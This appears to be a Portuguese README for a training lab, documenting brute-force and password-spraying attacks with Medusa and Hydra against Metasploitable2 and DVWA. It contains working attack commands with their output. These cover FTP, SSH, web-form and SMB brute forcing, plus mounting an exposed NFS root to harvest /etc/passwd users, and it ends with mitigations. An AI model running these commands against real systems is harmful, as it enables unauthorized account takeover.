# Desafio de Força Bruta com Medusa e Kali Linux

Esse projeto nasceu do desafio de prática da DIO sobre ataques de força bruta. A proposta era montar um laboratório com Kali Linux e Metasploitable2, atacar alguns serviços clássicos (FTP, DVWA, SMB) usando o Medusa e documentar o processo.

Na prática, acabou sendo um pouco mais do que isso. Pelo caminho usei o NFS como vetor complementar pra montar uma wordlist de usuários reais em vez de chutar nomes, esbarrei numa limitação real do Medusa com um dos serviços e precisei trocar de ferramenta no meio do ataque, e tive que investigar "na unha" por que alguns resultados que pareciam positivos na verdade eram falsos positivos. Resolvi manter tudo isso documentado aqui, porque é exatamente esse tipo de imprevisto que aparece num teste de segurança de verdade — não é só rodar comando e copiar a senha que apareceu na tela.

---

## Sumário

- [Ambiente de laboratório](#ambiente-de-laboratório)
- [Como organizei o trabalho](#como-organizei-o-trabalho)
- [1. FTP](#1-ftp)
- [2. NFS (vetor complementar)](#2-nfs-vetor-complementar)
- [3. SSH](#3-ssh)
- [4. DVWA (HTTP)](#4-dvwa-http)
- [5. SMB](#5-smb)
- [Resumo dos achados](#resumo-dos-achados)
- [Mitigações recomendadas](#mitigações-recomendadas)
- [O que eu aprendi com os imprevistos](#o-que-eu-aprendi-com-os-imprevistos)
- [Estrutura do repositório](#estrutura-do-repositório)

---

## Ambiente de laboratório

| Item | Detalhe |
|---|---|
| Atacante | Kali Linux (VirtualBox) |
| Alvo | Metasploitable2 (VirtualBox) — já vem com o DVWA instalado |
| Rede | Bridge (`enp5s0`) — isolada, só host e as duas VMs se enxergam |
| IP do alvo | `192.168.0.64` |
| Ferramentas | `nmap`, `medusa`, `hydra`, `enum4linux`, `smbclient`, `ftp`, `curl` |

---

## Como organizei o trabalho

Pra cada serviço segui mais ou menos o mesmo roteiro: primeiro reconhecimento (ver o que o `nmap` e os banners entregam de graça, sem nenhuma tentativa de senha), depois levantar uma hipótese do que pode estar mal configurado, só então partir pro ataque com wordlists pequenas e específicas, validar manualmente o que a ferramenta reportou (porque nem tudo que aparece como "sucesso" é sucesso de verdade, como vai ficar claro mais adiante) e, por fim, anotar tudo.

---

## 1. FTP

### Reconhecimento

```bash
nmap -sV -p 21 192.168.0.64
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
Service Info: OS: Unix
```

```bash
nmap -sV --script ftp-anon,ftp-syst -p 21 192.168.0.64
```
```
| ftp-syst:
|   STAT:
| FTP server status:
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

Só com esse scan, sem ter tentado nenhuma senha ainda, já dá pra ver que o login anônimo está liberado. É uma falha de configuração bem comum — aparece direto em NAS, mirrors mal configurados e qualquer coisa deixada no padrão de fábrica.

Vale registrar também: essa versão específica do vsftpd (2.3.4) tem uma backdoor conhecida (CVE-2011-2523). Não fui atrás dela porque está fora do escopo do desafio, que é sobre força bruta e não exploração direta, mas é bom já deixar anotado que a mesma versão carrega mais de um tipo de risco.

### Validando o acesso anônimo na mão

```bash
ftp 192.168.0.64
```
```
Name (192.168.0.64:kali): anonymous
331 Please specify the password.
230 Login successful.
ftp> cd /etc
550 Failed to change directory.
ftp> cd /home
550 Failed to change directory.
```

O anônimo entra, mas está preso num chroot jail configurado corretamente — não enxerga `/etc` nem `/home` reais do sistema. Isso muda bastante a gravidade do achado: um anônimo sem esse isolamento teria vazado o filesystem inteiro.

### Força bruta com Medusa

```bash
medusa -h 192.168.0.64 -U usuarios.txt -P senhas.txt -M ftp -v 6 -f -t 4
```
```
ACCOUNT FOUND: [ftp] Host: 192.168.0.64 User: postgres Password: postgres [SUCCESS]
```

Achei a credencial `postgres` / `postgres` — a mesma que apareceu depois no SSH. Ou seja, reuso de senha fraca entre dois serviços diferentes do mesmo sistema.

---

## 2. NFS (vetor complementar)

Isso não estava nos três cenários originais do desafio, mas usei pra resolver um problema prático: em vez de chutar nomes de usuário pra montar a wordlist, fui atrás dos usuários reais do sistema.

```bash
showmount -d 192.168.0.64
```
```
Directories on 192.168.0.64:
/
```

```bash
mkdir /tmp/meta_nfs
sudo mount -t nfs 192.168.0.64:/ /tmp/meta_nfs
grep -e 'bin/bash$' /tmp/meta_nfs/etc/passwd | cut -d: -f1 > usuarios.txt
```

O servidor exporta a raiz inteira do sistema de arquivos (`/`) sem restrição nenhuma (`no_root_squash`), e dá pra montar isso remotamente e ler o `/etc/passwd` como se eu fosse um usuário local. É uma falha grave por si só — na prática é dar acesso de leitura ao disco inteiro do servidor pra qualquer cliente da rede.

---

## 3. SSH

```bash
medusa -h 192.168.0.64 -U usuarios.txt -P senhas.txt -M ssh -v 6 -f -t 4
```
```
ACCOUNT FOUND: [ssh] Host: 192.168.0.64 User: postgres Password: postgres [SUCCESS]
```

De novo `postgres` / `postgres`, confirmado também com login manual via SSH direto.

---

## 4. DVWA (HTTP)

### Reconhecimento

```bash
nmap -sV --script http-title -p 80 192.168.0.64
```
```
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
```

```bash
curl -I http://192.168.0.64/dvwa/login.php
```
```
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=...; path=/
Set-Cookie: security=high
```

Antes de atacar, configurei o nível de segurança do DVWA pra **low** pelo navegador.

### Entendendo o formulário de login

Pelo DevTools (`Ctrl+U` / Inspecionar) dá pra ver o form de verdade:

```html
<form action="login.php" method="post">
  <input type="text" name="username">
  <input type="password" name="password">
  <input type="submit" value="Login" name="Login">
</form>
```

Essa versão não usa `user_token` (token CSRF) no login, o que também é um detalhe que vale anotar.

### Primeira tentativa com Medusa — e aí travou

```bash
medusa -h 192.168.0.64 -U teste_user.txt -P teste_pass.txt -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"login.php" \
  -m FORM-DATA:"post?username=&password=&Login=Login" -b -T 1 -v 6
```
```
ERROR: The answer was NOT successfully received, understood, and accepted while trying admin password: error code 302
```

Pra entender o que estava acontecendo, comparei manualmente, via `curl`, a resposta de um login errado com a de um login certo:

```bash
curl -i -d "username=teste&password=teste123&Login=Login" http://192.168.0.64/dvwa/login.php
# HTTP/1.1 302 Found
# Location: login.php          -> falha

curl -i -d "username=admin&password=password&Login=Login" http://192.168.0.64/dvwa/login.php
# HTTP/1.1 302 Found
# Location: index.php          -> sucesso
```

O DVWA usa redirecionamento HTTP (302) tanto pra falha quanto pra sucesso, mudando só o destino. O módulo `web-form` do Medusa trata o próprio código 302 como erro de protocolo e trava antes mesmo de olhar pro conteúdo da resposta — é uma limitação conhecida desse módulo com respostas baseadas em redirect.

O enunciado do desafio deixa claro que dá pra adaptar e experimentar outras ferramentas, então troquei pelo Hydra, que lida numa boa com esse tipo de resposta.

### Ataque com Hydra

```bash
hydra -L usuarios.txt -P senhas.txt 192.168.0.64 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=login.php"
```
```
[80][http-post-form] host: 192.168.0.64   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
```

Achei `admin` / `password` — a senha padrão de instalação do DVWA, nunca trocada. E dessa vez sem falso positivo nenhum, diferente de uma tentativa anterior com o `DENY-SIGNAL` mal digitado, que tinha marcado todo mundo como "sucesso" por engano (descobri e descartei esse resultado antes de chegar aqui).

---

## 5. SMB

### Reconhecimento e enumeração

```bash
nmap -sV -p 139,445 192.168.0.64
```
```
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

```bash
enum4linux -a 192.168.0.64
```

O que mais chamou atenção no resultado:

- `Server 192.168.0.64 allows sessions using username '', password ''` — sessão NULL (anônima) permitida
- 34 usuários do sistema enumerados via RID cycling e SAM, sem precisar de nenhuma credencial (`root`, `msfadmin`, `postgres`, `www-data`, `mysql`, entre outros)
- O share `tmp` dá pra listar sem autenticação; `print$`, `opt` e `ADMIN$` ficam negados pra sessão anônima
- Política de senha sem complexidade obrigatória, sem tamanho mínimo e, o mais importante, sem limite de tentativas de login (`Account Lockout Threshold: None`)

Só a sessão NULL já é uma falha séria, porque dá pra levantar toda a base de usuários do sistema sem credencial nenhuma — o que facilita demais um ataque de password spraying, já que fico sabendo exatamente quem atacar. E sem lockout de conta, na prática não existe limite de tentativas.

### Password spraying com Medusa

Diferente do brute force tradicional (muitas senhas pra um usuário só), o password spraying testa poucas senhas contra vários usuários, o que reduz o risco de bloquear a conta — e aqui faz sentido usar essa estratégia justamente porque já sei que não tem lockout configurado.

```bash
medusa -h 192.168.0.64 -U usuarios_smb.txt -P senhas_spray.txt -M smbnt -b -t 4
```
```
ACCOUNT FOUND: [smbnt] Host: 192.168.0.64 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

`msfadmin` / `msfadmin` — que, não por acaso, é a credencial padrão documentada do próprio Metasploitable2 — com acesso administrativo confirmado ao compartilhamento `ADMIN$`.

---

## Resumo dos achados

| Serviço | Vulnerabilidade | Severidade | Evidência |
|---|---|---|---|
| FTP | Login anônimo habilitado (chroot OK) | Média | `ftp-anon` + login manual |
| FTP | Credencial fraca `postgres/postgres` | Alta | Medusa `-M ftp` |
| NFS | Export sem restrição (`no_root_squash`) | Alta | `showmount` + mount remoto |
| SSH | Credencial fraca `postgres/postgres` (reuso) | Alta | Medusa `-M ssh` |
| DVWA | Senha padrão não alterada `admin/password` | Alta | Hydra `http-post-form` |
| SMB | Sessão NULL (enumeração completa de usuários) | Alta | `enum4linux -a` |
| SMB | Credencial padrão `msfadmin/msfadmin` com acesso admin | Crítica | Medusa `-M smbnt` |
| SMB | Sem política de lockout de conta | Média | `enum4linux` (password policy) |

---

## Mitigações recomendadas

**FTP**
- Desabilitar login anônimo (`anonymous_enable=NO` no `vsftpd.conf`), a menos que seja um uso intencional de distribuição pública
- Atualizar o vsftpd pra uma versão sem a backdoor conhecida
- Trocar credenciais padrão/fracas e aplicar política de senha forte

**NFS**
- Nunca exportar a raiz (`/`) do sistema
- Restringir exports por IP/sub-rede específicos (`/etc/exports`)
- Manter `root_squash` ativo, que é o padrão recomendado

**SSH**
- Trocar imediatamente credenciais padrão/fracas
- Habilitar autenticação por chave pública e desabilitar login por senha quando der
- Colocar `fail2ban` ou equivalente pra limitar tentativas

**DVWA / aplicações web em geral**
- Trocar a senha padrão de qualquer aplicação recém-instalada antes de expor
- CAPTCHA e/ou delay progressivo depois de tentativas falhas
- Rate limiting no servidor web ou num WAF

**SMB**
- Desabilitar sessões NULL/anônimas (`restrict anonymous` no `smb.conf`)
- Política de senha forte com complexidade obrigatória
- Lockout de conta depois de N tentativas falhas
- Rever permissões dos compartilhamentos administrativos (`ADMIN$`, `C$`)

---

## O que eu aprendi com os imprevistos

Nem toda falha de ferramenta é um beco sem saída. O erro do Medusa com o 302 do DVWA não invalidou o teste — só me obrigou a investigar mais fundo (a comparação manual via `curl`) e justificar a troca pra outra ferramenta, que é mais ou menos o que acontece num teste de segurança real quando a ferramenta "padrão" não dá conta de um cenário específico.

Validar na mão também fez diferença de verdade. Em mais de um momento, o Medusa reportou "sucesso" pra todas as credenciais testadas de uma vez — um falso positivo bem óbvio depois que parei pra olhar com atenção. Se eu tivesse só copiado o resultado sem checar, esse dado errado teria ido parar na documentação final.

E o reuso de credencial (`postgres/postgres` aparecendo em FTP e SSH) é um padrão de risco que vejo direto em ambiente real também, não é coisa só de laboratório. Isoladamente, sessão NULL do SMB ou anônimo do FTP até parecem detalhes menores, mas juntando tudo — enumeração de usuários, ausência de lockout e credenciais fracas — dá uma cadeia de ataque completa e de baixo esforço.

---

## Estrutura do repositório

```
metasploitable2-bruteforce-lab/
├── README.md
├── wordlists/
│   ├── usuarios.txt
│   ├── usuarios_smb.txt
│   ├── senhas.txt
│   └── senhas_spray.txt
└── images/
    ├── ftp/
    ├── dvwa/
    └── smb/
```
